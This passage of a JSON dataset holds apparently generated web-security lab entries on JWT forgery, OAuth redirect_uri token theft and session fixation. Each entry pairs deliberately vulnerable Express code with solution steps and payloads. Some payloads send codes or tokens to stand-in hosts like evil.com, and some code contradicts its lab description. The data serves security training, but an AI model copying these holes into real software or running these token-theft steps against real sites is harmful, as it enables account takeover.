        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (authHeader) { const token = authHeader.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user && req.user.username) res.send(`Welcome ${req.user.username}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"carlos\"}",
          "Token: base64(header).base64(payload). (no signature)",
          "Authorization: Bearer <forged_token>"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration with open redirect",
        "Lab Description": "The application uses OAuth for authentication but fails to validate the redirect_uri parameter strictly. An attacker can manipulate this parameter to redirect the OAuth authorization code to their own server and steal access tokens. To solve: Capture Carlos's access token by injecting a malicious redirect_uri.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp Suite and intercept the OAuth flow",
          "Note the request to /auth?redirect_uri=https://example.com/callback",
          "Modify the redirect_uri to point to your attacker server (e.g., https://evil.com/code-catcher)",
          "Host a temporary server (e.g., using ngrok or python3 -m http.server) to receive the token/code",
          "Send the malicious link to Carlos. When he logs in, intercept the token on your server",
          "Use the stolen access token to access /my-account as Carlos"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'abc123';  res.redirect(`${redirectUri}?code=${code}`); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post('https://oauth.provider.com/token', { form: { code, client_id: '123', client_secret: 'xyz' } }, (err, resp, body) => { res.send(`Access granted with token: ${body}`); }); }); app.listen(4000);",
        "payloads": [
          "/auth?redirect_uri=https://evil.com/capture",
          "GET https://evil.com/capture?code=abc123",
          "Use token abc123 at /my-account"
        ]
      }
      ,
      {
        "Lab scenario": "REST API JWT authentication bypass via weak secret",
        "Lab Description": "The application uses JWT tokens to authenticate API users. It signs tokens using a weak secret and does not validate the 'alg' claim properly. The application exposes an endpoint that echoes back the token payload for debugging. To solve: craft a forged JWT token that grants admin access and use it to access the protected /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to send a login request and capture the JWT token in the response.",
          "Use jwt.io or Burp Suite's JWT extension to decode and analyze the token structure and signing algorithm.",
          "Use a tool like `jwt-cracker` or `John the Ripper` to brute-force the weak secret (e.g., 'secret', 'admin123').",
          "Modify the payload to set 'role':'admin', then re-sign using the cracked secret and 'HS256' algorithm.",
          "Send the forged token in an Authorization: Bearer header to /admin and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'admin123'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } });",
        "payloads": [
          "HS256 token with header: {\"alg\":\"HS256\"}, payload: {\"username\":\"carlos\",\"role\":\"admin\"}, signed with 'admin123'",
          "jwt.io-generated token using known secret 'secret'",
          "Manually forged token with cracked secret using PyJWT"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth Implicit Flow Access Token Leak in Referer Header",
        "Lab Description": "The application uses the OAuth 2.0 Implicit flow for authentication. After login, it redirects the user to a third-party domain while leaking the access token in the Referer header. To solve: intercept and steal Carlosâ€™s OAuth access token via a malicious redirect URI, then use it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the redirect URL after OAuth login and confirm token is returned in URL fragment (#access_token).",
          "Register a new OAuth client with a redirect_uri to your attacker domain (e.g., https://evil.com).",
          "Modify the /authorize request to use the attacker redirect_uri and send link to Carlos.",
          "When Carlos logs in, his browser sends the access_token in the Referer header to evil.com.",
          "Use the stolen token in Authorization header to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const redirect = req.query.redirect_uri; const token = 'access-token-carlos'; res.redirect(`${redirect}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access-token-carlos') { res.send('Carlos Account Access'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
        "payloads": [
          "https://evil.com#access_token=access-token-carlos",
          "OAuth authorize URL with redirect_uri=https://evil.com",
          "Authorization: Bearer access-token-carlos"
        ]
      }
      ,
      {
        "Lab scenario": "Session Fixation vulnerability in login endpoint",
        "Lab Description": "The application generates a session ID in a cookie before login and fails to regenerate it after authentication. The session ID is predictable and can be fixed prior to victim login. To solve: set a session ID for the victim, trick them into logging in, then reuse the same ID to access their session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite or browser to set a session cookie before login (e.g., sessionid=1234carlos).",
          "Send a phishing link to Carlos with the pre-set sessionid=1234carlos cookie.",
          "After Carlos logs in, revisit the site and reuse the same sessionid to access his authenticated session.",
          "Access /my-account while presenting the fixed sessionid.",
          "Verify Carlosâ€™s account content is accessible."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid] === 'carlos') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
        "payloads": [
          "Cookie: sessionid=1234carlos",
          "Pre-login fixed session ID and reuse after login",
          "Phishing link that sets session cookie before login"
        ]
      }
      ,
      {
        "Lab scenario": "JWT tampering vulnerability in Authorization header handling",
        "Lab Description": "This lab involves a vulnerable REST API that authenticates users based on JWTs passed via the Authorization header. The server does not verify the token signature. The application decodes the token and grants access based solely on the 'role' claim. To solve: craft a tampered JWT with elevated privileges to access the /admin/data endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to send a GET request to /user/profile with a valid JWT and inspect the Authorization: Bearer <JWT> header.",
          "Decode the JWT using jwt.io and inspect the payload claims.",
          "Observe that the 'alg' in the header is set to 'HS256', and the signature isn't verified server-side.",
          "Modify the JWT payload to { \"user\": \"carlos\", \"role\": \"admin\" } and change 'alg' to 'none'.",
          "Remove the signature and send the tampered token in the Authorization header to /admin/data using Postman to confirm privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.get('/admin/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Admins only'); res.send('Sensitive admin data'); }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
          "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.fake-signature"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration in authorization code grant exchange",
        "Lab Description": "This lab uses the OAuth 2.0 authorization code grant flow. The application does not validate the `redirect_uri` during the token exchange, allowing an attacker to intercept the authorization code. To solve: hijack the OAuth flow to gain an access token for Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth flow when logging in via the third-party provider.",
          "Capture the authorization code sent to your redirect_uri.",
          "Send a crafted POST request to /oauth/token using Carlos's authorization code and your own redirect_uri.",
          "Observe that the server does not validate the redirect_uri and issues you an access token.",
          "Use the stolen access token to access Carlosâ€™s protected profile endpoint: /user/carlos/profile"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.post('/oauth/token', (req, res) => { const { code, redirect_uri } = req.body; const validCode = 'AUTHCODE123'; if (code === validCode) { return res.json({ access_token: 'access-token-for-carlos' }); } res.status(400).json({ error: 'Invalid code' }); }); app.get('/user/:id/profile', (req, res) => { if (req.headers.authorization === 'Bearer access-token-for-carlos') res.send('Carlos profile data'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
        "payloads": [
          "POST /oauth/token { code=AUTHCODE123, redirect_uri=http://attacker.com/callback }",
          "Authorization: Bearer access-token-for-carlos"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "This lab implements session-based authentication using a fixed session ID passed as a cookie. The application does not regenerate session IDs upon login, enabling session fixation attacks. To solve: set a session ID cookie before login, then trick Carlos into logging in with it and reuse the session.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "Set a cookie manually in the browser: sessionid=abc123 before visiting the login page.",
          "Use Burp Suite to intercept the login request and observe that the session ID remains unchanged after login.",
          "Send Carlos a phishing link that sets the sessionid=abc123 and directs him to the login page.",
          "After Carlos logs in, reuse the same sessionid=abc123 cookie in your browser.",
          "Access /my-account to retrieve Carlos's account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; sessions[sid] = { user: 'carlos' }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.user === 'carlos') res.send('Carlos Account Info'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Set-Cookie: sessionid=abc123",
          "GET /login with sessionid=abc123",
          "GET /my-account with sessionid=abc123 after Carlos login"
        ]
      }
      ,
      {
        "Lab scenario": "JWT tampering using alg=none in Authorization header",
        "Lab Description": "This lab's authentication mechanism relies on JSON Web Tokens (JWTs) passed in the Authorization header. The server trusts the JWT without verifying the signature if the algorithm is set to 'none'. This allows tampering with token content. The application uses the JWT's 'role' claim to grant admin access. To solve: Modify the JWT to escalate privileges and access the admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a valid login and extract the JWT from the Authorization header.",
          "Decode the JWT using jwt.io or a local script and inspect the header and payload.",
          "Modify the JWT header: change 'alg' to 'none'. In the payload, change 'role' to 'admin'.",
          "Remove the signature portion completely and base64 encode the new header and payload.",
          "Replace the original JWT in the Authorization header with the tampered one and access the /admin page to confirm escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'pass123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome Admin'); else return res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "{\"alg\":\"none\"}.{ \"username\": \"carlos\", \"role\": \"admin\" }"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation in login flow using predictable session ID",
        "Lab Description": "This lab suffers from a session fixation vulnerability. The session ID is set before login and remains unchanged after authentication. The attacker can pre-generate a session ID and trick the victim into using it. After the victim logs in, the attacker hijacks the session. To solve: Fixate Carlos's session and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to GET /session before login and extract the session cookie.",
          "Send the session ID to the victim (simulated) and have them log in via that session.",
          "After the victim logs in, reuse the same session ID in your cookies to access the /my-account endpoint.",
          "Use Burp Suite Repeater to send GET /my-account with the fixed session ID.",
          "Confirm access to the victim's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user; res.redirect('/my-account'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { if (req.session?.user) return res.send(`Welcome ${req.session.user.username}`); else res.status(403).send('Login required'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "GET /login with fixed session cookie",
          "Cookie: connect.sid=sess123fixed",
          "Hijack connect.sid after victim login"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration via open redirect leads to token theft",
        "Lab Description": "This lab's OAuth implementation incorrectly trusts arbitrary redirect_uris during the OAuth flow. By supplying a malicious redirect URI, an attacker can intercept the authorization code and exchange it for an access token. To solve: Capture Carlos's access token and access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify the OAuth authorization endpoint and confirm that any redirect_uri is accepted.",
          "Craft a malicious URL pointing the victim to the authorization endpoint with redirect_uri set to attacker.com.",
          "Simulate user click (victim logs in and consents) and intercept the authorization code sent to attacker.com.",
          "Exchange the stolen code using Postman or curl for an access token at the token endpoint.",
          "Use the access token in the Authorization header to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthClients = [{ client_id: 'trusted-app', client_secret: 'abc123' }]; app.get('/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; res.redirect(`${redirect_uri}?code=1234`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code, client_id, client_secret } = req.body; if (code === '1234' && client_id === 'trusted-app' && client_secret === 'abc123') return res.json({ access_token: 'valid-token-for-carlos' }); res.status(400).send('Invalid request'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'valid-token-for-carlos') return res.send('Account details for Carlos'); else return res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
        "payloads": [
          "https://vulnerable.com/authorize?client_id=trusted-app&redirect_uri=https://attacker.com",
          "POST /token { code: 1234, client_id: trusted-app, client_secret: abc123 }",
          "Authorization: Bearer valid-token-for-carlos"
        ]
      }
      ,
      {
        "Lab scenario": "RESTful JWT tampering in login endpoint",
        "Lab Description": "The application uses a JWT for authentication and verifies it using a public key. However, the algorithm field in the token header is not validated correctly, allowing attackers to manipulate it. The application blindly trusts unsigned tokens when 'alg' is set to 'none'. To solve: log in as the admin user and access the dashboard endpoint using a tampered token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a valid JWT token via Postman while logging in with your own user credentials.",
          "Use jwt.io or Burp Suite to decode the token and analyze the header and payload.",
          "Change the alg field from 'RS256' to 'none' and modify the payload to {\"username\": \"admin\"}.",
          "Remove the signature section entirely and send the manipulated token in the Authorization header: Bearer <tampered_token>.",
          "Access the /admin/dashboard endpoint and confirm access is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, publicKey); if (decoded.username === 'admin') res.send('Admin access granted'); else res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Tampering Lab running...'));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}, Payload: {\"username\":\"admin\"}, no signature",
          "Authorization: Bearer <base64(header)>.<base64(payload)>.",
          "Token manipulation via jwt.io with RS256 â†’ none and admin payload"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
        "Lab Description": "This application integrates third-party OAuth authentication but fails to validate redirect URIs. An attacker can craft an authorization URL with an open redirect in the redirect_uri parameter to intercept the authorization code. To solve: obtain the victim's authorization code and exchange it for an access token, then retrieve their email.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite or OWASP ZAP to intercept the OAuth flow.",
          "Craft a malicious OAuth URL with redirect_uri set to https://malicious-site.com/oauth/callback.",
          "Send this URL to the victim (can simulate by pasting directly into the browser).",
          "Once the victim authenticates, capture the authorization code from the malicious site's endpoint.",
          "Exchange the stolen code for an access token using Postman and access the /userinfo endpoint to fetch victim data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const client_id = 'app123'; res.redirect(`https://oauth-provider.com/auth?client_id=${client_id}&redirect_uri=${redirect_uri}`); }); app.get('/callback', async (req, res) => { const code = req.query.code; const token = await axios.post('https://oauth-provider.com/token', { code }); const userinfo = await axios.get('https://oauth-provider.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Logged in as ${userinfo.data.email}`); }); app.listen(4000, () => console.log('OAuth Lab running...'));",
        "payloads": [
          "https://target-site.com/auth?redirect_uri=https://evil.com/oauth/callback",
          "POST /token { code: <stolen_code> }",
          "GET /userinfo Authorization: Bearer <access_token>"
        ]
      }
      ,
      {
        "Lab scenario": "SOAP API session fixation via pre-set cookie",
        "Lab Description": "The SOAP-based login endpoint accepts pre-set session IDs via cookies. The application does not regenerate session IDs after login. This allows an attacker to fix the session ID before victim logs in, then reuse it to impersonate the session. To solve: Fix a session ID, trick the victim to use it, and access the /myAccount endpoint as the victim.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "Use Postman or Burp to send a GET /init-session request with a custom session ID in Cookie: sessionId=abc123.",
          "Trick the victim to log in using the same sessionId (simulate login with cookie set).",
          "After victim logs in, reuse Cookie: sessionId=abc123 to send a GET /myAccount request.",
          "Observe that you're now authenticated as the victim.",
          "Access /myAccount to confirm session fixation worked."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const soap = require('soap'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.post('/soap-login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies['sessionId']; if (username === 'victim' && password === 'securepass') { sessions[sessionId] = username; res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/myAccount', (req, res) => { const user = sessions[req.cookies['sessionId']]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running...'));",
        "payloads": [
          "Cookie: sessionId=abc123",
          "POST /soap-login with sessionId=abc123 in cookie",
          "GET /myAccount with sessionId=abc123"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation in login flow",
        "Lab Description": "This lab demonstrates session fixation where the session ID is accepted from the user's request instead of being regenerated after login. The application uses a session token passed as a cookie and fails to rotate it after successful authentication, allowing attackers to hijack sessions. To solve: Fixate Carlos's session, then login as him using a pre-set session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request to the login page and observe the 'sessionid' cookie being set by the client.",
          "Send a GET request to /login with a custom session ID: Cookie: sessionid=attackerSession123",
          "Log in using your own credentials and observe that the session ID is accepted and retained.",
          "Send the session fixation link with your controlled session ID to Carlos (assume simulated delivery).",
          "Once Carlos logs in via that link, reuse attackerSession123 as Cookie to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'abc123' }]; const sessions = {}; app.get('/login', (req, res) => { const sessionid = req.cookies.sessionid || req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionid = req.cookies.sessionid; sessions[sessionid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionid = req.cookies.sessionid; const username = sessions[sessionid]; if (username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "GET /login?sessionid=attackerSession123",
          "Cookie: sessionid=attackerSession123",
          "POST /login with username=carlos and password=abc123 using attackerSession123 cookie"
        ]
      }
      ,
      {
        "Lab scenario": "JWT signature bypass using 'none' algorithm",
        "Lab Description": "This lab uses JWT tokens for authentication but fails to properly validate the algorithm field. It accepts tokens with the 'none' algorithm, allowing attackers to craft arbitrary tokens without a valid signature. To solve: Forge a token to impersonate Carlos and access the account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Log in as your own user and capture the JWT token using Burp or Postman.",
          "Decode the token using jwt.io or jwt_tool to identify the structure.",
          "Modify the payload to change 'username' to 'carlos' and set 'alg' to 'none' in the header.",
          "Remove the signature entirely and rebase64 the header and payload manually.",
          "Send the forged token in the Authorization: Bearer header and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecretkey'); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
          "Payload: { \"username\": \"carlos\" }",
          "Forged token: base64url(header) + '.' + base64url(payload) + '.'"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
        "Lab Description": "This lab simulates a vulnerable OAuth login where the redirect_uri is not properly validated. By manipulating the redirect_uri parameter, an attacker can intercept tokens issued to users. To solve: Steal Carlos's token and access the protected resource as him.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP or Burp Suite to analyze the OAuth flow when logging in via a third-party provider.",
          "Observe that redirect_uri is passed from the client and not strictly validated by the authorization server.",
          "Craft a malicious URL that points redirect_uri to your own domain: https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
          "Convince Carlos to visit the crafted link (social engineering assumed).",
          "Intercept the token at evil.com and reuse it in an Authorization: Bearer header to access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id !== '123') return res.status(403).send('Invalid client'); const token = 'token-for-carlos';  res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-for-carlos') res.send('Welcome Carlos!'); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
          "Intercepted token: token-for-carlos",
          "GET /my-account with Authorization: Bearer token-for-carlos"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation via pre-set session cookie",
        "Lab Description": "The application uses session cookies to manage user authentication, but fails to regenerate them after login. A malicious actor can fix a known session ID before login, and force the victim to authenticate using it. The application reflects session IDs without regenerating them. To solve: hijack Carlos's session by fixing the session ID before he logs in.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite Proxy to intercept GET /login and inject your custom session cookie (e.g. sessionid=abc123).",
          "Send the login page URL to Carlos (e.g. via social engineering) with the fixed sessionid embedded via Set-Cookie.",
          "Wait for Carlos to log in, using the sessionid you supplied.",
          "After he logs in, reuse the fixed sessionid to access authenticated pages.",
          "Verify access to /my-account as Carlos to confirm exploitation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cur3' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('sessionid', req.cookies.sessionid || Math.random().toString(36), { httpOnly: true }); return res.send('Login successful'); } return res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid) return res.send('Welcome back, session: ' + req.cookies.sessionid); res.status(401).send('Please login'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
        "payloads": [
          "sessionid=abc123",
          "Set-Cookie: sessionid=abc123",
          "GET /login HTTP/1.1 with Cookie header injection",
          "POST /login with attacker-supplied session ID"
        ]
      }
      ,
      {
        "Lab scenario": "JWT algorithm confusion in authentication tokens",
        "Lab Description": "The app uses JWTs to authenticate users, but allows algorithm tampering in the header. It incorrectly trusts the 'alg' claim and accepts unsigned tokens when 'none' is specified. To solve: forge a valid token for Carlos without a signature.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT after logging in using Burp Suite or Postman.",
          "Decode the token header and change 'alg' to 'none'.",
          "Replace the 'sub' or 'username' claim to 'carlos'.",
          "Re-encode the JWT without a signature section.",
          "Submit the forged token in Authorization: Bearer header and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') return res.send('Welcome Carlos'); } catch (e) { return res.status(401).send('Invalid token'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Lab running...'));",
        "payloads": [
          "Header: { \"alg\": \"none\" }, Payload: { \"username\": \"carlos\" }",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer <forged-token>"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth redirect URI manipulation",
        "Lab Description": "The application uses OAuth to log in users via a third-party provider. However, it fails to validate the redirect_uri parameter correctly, enabling attackers to steal tokens. The app reflects the redirect_uri without whitelisting. To solve: intercept the OAuth flow and capture Carlos's token.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "Use OWASP ZAP to proxy and analyze the OAuth flow.",
          "Start an OAuth login and note the authorize request with the redirect_uri parameter.",
          "Change the redirect_uri to your own server (e.g., http://evil.com/callback).",
          "Send Carlos the modified authorization URL.",
          "Intercept the redirected request containing Carlosâ€™s token at your server and use it to access his account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query;  return res.redirect(redirect_uri + '?code=' + code); }); app.listen(4000, () => console.log('OAuth Redirect Lab running...'));",
        "payloads": [
          "redirect_uri=http://evil.com/callback",
          "https://target.com/auth?client_id=abc&redirect_uri=http://evil.com/callback&response_type=token",
          "Authorization URL with malicious redirect"
        ]
      }
      ,
      {
        "Lab scenario": "Insecure JWT validation in Authorization header (None algorithm tampering)",
        "Lab Description": "The application uses JWTs for user authentication and includes the token in the Authorization header. The server does not correctly verify the algorithm used to sign the JWT. The application trusts unsigned tokens if they specify 'alg':'none'. To solve: craft a tampered token impersonating 'carlos' and access the protected profile endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request after logging in and capture the JWT from the Authorization header.",
          "Use jwt.io or Burp Decoder to decode the token and observe the header with algorithm 'HS256'.",
          "Change the 'alg' to 'none' and remove the signature part, replacing it with an empty string.",
          "In Burp Repeater, modify the original Authorization header to use the tampered JWT with 'carlos' in the payload.",
          "Send the request to the /profile endpoint and verify if access is granted as 'carlos'."
        ],
        "Vulnerability name": "Authentication",
